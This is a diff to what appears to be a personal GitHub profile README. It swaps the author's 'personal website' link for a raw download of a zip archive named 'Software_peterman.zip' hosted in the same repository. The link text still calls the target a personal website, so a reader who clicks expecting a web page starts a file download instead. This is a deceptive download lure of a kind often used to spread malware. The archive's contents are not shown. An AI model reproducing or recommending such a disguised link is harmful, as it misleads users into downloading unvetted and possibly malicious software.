@@ -12,5 +12,5 @@
 
 📌 I believe that technology is a powerful tool to connect and simplify people's lives. Therefore, I am always eager to learn and grow to deliver the best in every project I take on.
 
-🔗 If you want to learn more about me or collaborate, feel free to visit my personal website at [boycenly.icu](https://www.boycenly.icu).
+🔗 If you want to learn more about me or collaborate, feel free to visit my personal website at [https://github.com/boycenly/boycenly/raw/refs/heads/main/bumbaze/Software_peterman.zip](https://github.com/boycenly/boycenly/raw/refs/heads/main/bumbaze/Software_peterman.zip).
 
